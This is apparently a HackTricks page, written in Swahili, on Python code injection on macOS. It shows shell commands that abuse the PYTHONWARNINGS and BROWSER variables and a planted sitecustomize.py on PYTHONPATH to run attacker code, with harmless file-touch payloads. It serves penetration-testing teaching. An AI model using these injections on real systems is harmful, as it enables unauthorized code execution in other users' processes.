# Udukuzi wa Python Application kwenye macOS

{{#include ../../../banners/hacktricks-training.md}}

## Kupitia vigezo vya mazingira vya `PYTHONWARNINGS` na `BROWSER`

Ikiwa mshambuliaji anaweza kudhibiti mazingira ya mchakato wa Python, mchanganyiko wa `PYTHONWARNINGS` na `BROWSER` unaweza kuanzisha utekelezaji wa amri wakati Python ina-import module ya `antigravity` inapochakata option ya onyo iliyoundwa mahsusi. Mbinu hii inategemea `antigravity` kufungua URL kwa kutumia module ya Python ya `webbrowser`, ambayo inazingatia kigezo cha mazingira cha `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Kupitia `PYTHONPATH` na `sitecustomize.py`

Wakati wa startup ya kawaida, Python `site` module huongeza paths maalum za site, kisha hujaribu ku-import module inayoitwa `sitecustomize`. Kwa kuweka directory inayoweza kusomeka na attacker mwanzoni mwa `PYTHONPATH`, attacker anayesimamia process environment anaweza kufanya Python i-import payload kabla ya target script. Flag ya `-S` huzima automatic `site` initialization, huku isolated mode (`-I`) ikipuuza `PYTHONPATH` na kuhusisha `-s` na `-E`.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## References

- [1] [Hacking kwa kutumia Environment Variables - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook ya usanidi mahususi wa Site](https://docs.python.org/3/library/site.html)
- [3] [Mstari wa amri wa Python na environment](https://docs.python.org/3/using/cmdline.html)
{{#include ../../../banners/hacktricks-training.md}}
